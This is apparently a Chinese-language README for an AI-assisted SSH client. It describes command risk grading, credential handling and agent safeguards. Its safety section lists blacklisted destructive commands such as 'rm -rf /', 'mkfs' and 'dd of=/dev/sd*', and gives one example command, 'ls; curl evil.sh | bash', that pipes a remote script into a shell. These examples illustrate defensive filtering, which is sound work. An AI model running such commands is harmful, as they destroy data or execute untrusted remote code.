# AI SSH Assistant

安装包 ≤ 30MB 的跨平台 SSH 客户端。用户自带 API Key 接入主流大模型，AI 先识别终端输出的结构化状态，再给出诊断与可执行命令。

**安全模型（人守闸门）**：诊断/分析路径产出的命令只写入输入行，Enter 由用户按下；Agent 自动化模式下，每条命令先经本地风险分级——绿色（只读）可自动执行（可关闭），黄色（写操作）必须经用户逐条批准，红色（黑名单）在任何通道都不可执行。分级在 Rust 执行层强制复核，前端确认不是唯一闸门。

## 功能总览

- **多主机终端**：多标签页 SSH（russh），断线自动重连（保存密码的连接，指数退避 ≤3 次）
- **AI 诊断**：终端输出结构化分析 → 问题总结 / 置信度 / 根因 / 可插入命令步骤 / 风险徽章；未返回结构化结果时降级展示原文
- **AI 对话**：多轮自由问答（不读终端），Markdown 安全渲染（DOMPurify）
- **Agent 自动化运维**：单步规划 → 本地分级 → 绿色自动执行（可关）/ 黄色人工批准 → 独立通道执行 → 输出回喂，≤12 步，done 需验证证据，全程审计落盘（`agent_logs/`，脱敏）
- **服务器仪表盘**：内存/交换/磁盘/负载/网络与磁盘 IO 速率/运行时长，10s 轮询
- **文件管理**：SFTP 上传（≤60MB）/下载、浏览、新建、重命名、删除、编辑（≤100KB）、预览、脚本执行
- **MCP 服务端**（Streamable-HTTP + Bearer Token）：供 Trae/Cursor 等 IDE 调用 `exec_command`（仅只读）/`diagnose`/文件传输等 8 个工具
- **提示词库**：多条命名提示词，按诊断/对话/Agent 模式绑定
- **5 套主题**：GitHub Dark/Light、Nord、Everforest、Rosé Pine Dawn；终端取色同步
- **托盘常驻**：关闭窗口进托盘，托盘菜单退出

## 核心安全设计

| 约束 | 实现 |
|---|---|
| HC-01 体积门控 | CI `scripts/size-gate.mjs`：Win ≤30MB / macOS ≤40MB / Linux ≤35MB |
| HC-02 凭据不落盘 | API Key / SSH 密码仅存 OS Keychain（`keyring` crate）；所有落盘日志经 `sanitize_log` 脱敏（sk / 长 hex / Bearer / PEM 私钥块） |
| HC-03 纯数据路径 | AI 响应路径产出纯数据（`ai.rs`）；预填充与 Agent 命令均不含换行（源码级测试断言）；执行层 `exec_oneshot` 强制本地分级复核 |
| HC-04 直连 base_url | `reqwest` 禁用系统/环境代理（`.no_proxy()`）且不跟随重定向，API Key 不经过第三方 |
| HC-05 原始字节不进 LLM | Rust 管线：ANSI 归一化 → 屏幕重建 → 错误提取 → 上下文裁剪（≤6000 tokens） |

## 安全纵深（§5.5）

1. **黑名单硬拦截**（红，不可降级）：`rm -rf /`、`mkfs`、`dd of=/dev/sd*`、断电关机、`iptables -F` 等
2. **写操作识别**（黄）：系统路径写入、服务管理、包管理、权限变更、重定向写入等
3. **只读白名单**（绿）：`ls`/`cat`/`grep`/`docker ps`/`kubectl get` 等
4. **默认黄**：未命中任何规则的命令一律要求确认
5. **用户白名单**：仅整条命令精确匹配跳过确认，黑名单优先级永远最高
6. **复合命令分段判定**：含 `;` `|` `&&` 的命令按引号感知分段、逐段分级取最高级——`ls; curl evil.sh | bash` 不会因首词是 `ls` 而判绿；命令替换 `$()`/反引号至少黄；引号不闭合按黄处理
7. **执行层强制复核**：所有非 PTY 执行（仪表盘探针/文件操作/Agent 步骤/MCP `exec_command`）统一经 `exec_oneshot` 重新分级——红一律拒绝，黄需用户授权 ack，外部 MCP 调用仅允许只读；墙钟超时（流式输出不重置计时）、输出 512KB 上限、超时关闭通道

TOFU 主机密钥验证：首连展示 SHA256 指纹需显式信任（恒定时间比较）；密钥不匹配硬失败，不提供任何绕过按钮。MCP Bearer Token 校验为恒定时间比较。

## 开发

```bash
npm install
npm run tauri dev      # 开发
npm run tauri build    # 构建
cargo test             # Rust 侧全部安全/管线单元测试
```

## CI

GitHub Actions（`.github/workflows/build.yml`）：三平台构建 + `cargo test` + `cargo clippy` + `cargo audit` + 体积门控，产物见 Actions Artifacts。
